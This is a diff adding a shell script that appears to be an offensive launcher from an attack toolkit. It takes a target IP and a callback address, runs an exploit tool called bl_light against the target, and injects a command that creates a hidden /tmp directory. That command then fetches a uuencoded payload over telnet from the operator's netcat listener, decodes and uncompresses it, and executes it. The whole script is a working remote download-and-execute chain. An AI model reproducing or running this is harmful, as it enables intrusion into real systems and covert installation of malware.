@@ -1,0 +1,78 @@
+#!/bin/sh
+
+##########################################################
+### Generate & run the following scripts:
+###     - script to upload grinch on target (gr_upload.scr)
+###     - script to upload gr_upload.scr (initial_upload.scr)
+###     - run grins/frowns/whatever using the above scripts
+##########################################################
+
+# Some default values
+SCRIPT="/tmp/.t"
+DIR="/tmp/.X11R6"
+CALLBACK_PORT=32177
+
+usage() {
+    echo ""
+    echo "Before running this script, you first need to run the following:"
+    echo "      nc -l -p localPort < file2Xfer&Run.uu"
+    echo "      (nc must be in your path; it's also run w/in this script)"
+    echo "where file2Xfer&Run.uu is a compressed, uuencoded file."
+    echo ""
+    echo ""
+    echo "Usage: ${0} [options] -- [options to <file2Xfer&Run>]"
+    echo "  -i <target ip>               (required)"
+    echo "  -l <callback ip>             (required)"
+    echo "  -p <callback port>           def = $CALLBACK_PORT"
+    echo "  -f <file2Xfer&Run>           (required)"
+    echo "  -D <remoteDir>               def= $DIR"
+    exit 1
+}
+
+# There must be at least one argument
+if [ ${#} -eq 0 ]; then
+    usage
+fi
+
+#
+# Process args
+#
+    while getopts p:g:i:l:n:u:f:D: op; do
+        case $op in
+        i)  TARGET_IP="$OPTARG";;
+	p)  CALLBACK_PORT="$OPTARG";;
+        l)  LOCAL_IP="$OPTARG";;
+        n)  PASS="$OPTARG";;
+        u)  USER="$OPTARG";;
+        f)  RUN_FILE="$OPTARG";;
+        D)  DIR="$OPTARG";;
+        esac
+    done
+    cmdFlag="-c"
+    shift `expr $OPTIND - 1`
+
+# Check for required args
+    [ -z "$TARGET_IP" ] && echo "Error: missing remote IP" && usage
+    [ -z "$LOCAL_IP" ] && echo "Error: missing callback IP" && usage
+    [ -z "$RUN_FILE" ] && echo "Error: missing file2Xfer&Run: i.e. nscd or sendmail" && usage
+
+echo "Generating initial upload script."
+# Ditching the initial script stuff because bl_light reads the string from the command line....
+
+# Note      if you are doing shell stuff, make sure you do the sh -c string.....
+
+#cat > initial_upload.scr << EOF
+#/bin/sh -c "mkdir ${DIR} 2>/dev/null; cd ${DIR} && telnet ${LOCAL_IP} ${CALLBACK_PORT} 2>/dev/null </dev/console > ${RUN_FILE}.uu; uudecode ${RUN_FILE}.uu && uncompress -f ${RUN_FILE}.Z && chmod 0700 ${DIR}/${RUN_FILE} && PATH=${DIR} ${RUN_FILE}"
+#EOF
+
+echo "now running:  "
+
+#echo "boss_lad -t ${TARGET_IP} -c ./initial_upload.scr "
+echo "bl_light ${TARGET_IP} '/bin/sh -c \"mkdir ${DIR} 2>/dev/null; cd ${DIR} && telnet ${LOCAL_IP} ${CALLBACK_PORT} 2>/dev/null </dev/console > ${RUN_FILE}.uu; uudecode ${RUN_FILE}.uu && uncompress -f ${RUN_FILE}.Z && chmod 0700 ${DIR}/${RUN_FILE} && PATH=${DIR} ${RUN_FILE}\"'"
+
+#./boss_lad -t ${TARGET_IP} -c ./initial_upload.scr
+./bl_light ${TARGET_IP} "/bin/sh -c \"mkdir ${DIR} 2>/dev/null; cd ${DIR} && telnet ${LOCAL_IP} ${CALLBACK_PORT} 2>/dev/null </dev/console > ${RUN_FILE}.uu; uudecode ${RUN_FILE}.uu && uncompress -f ${RUN_FILE}.Z && chmod 0700 ${DIR}/${RUN_FILE} && PATH=${DIR} ${RUN_FILE}\""
+
+echo "Thank you for playing"
+
+
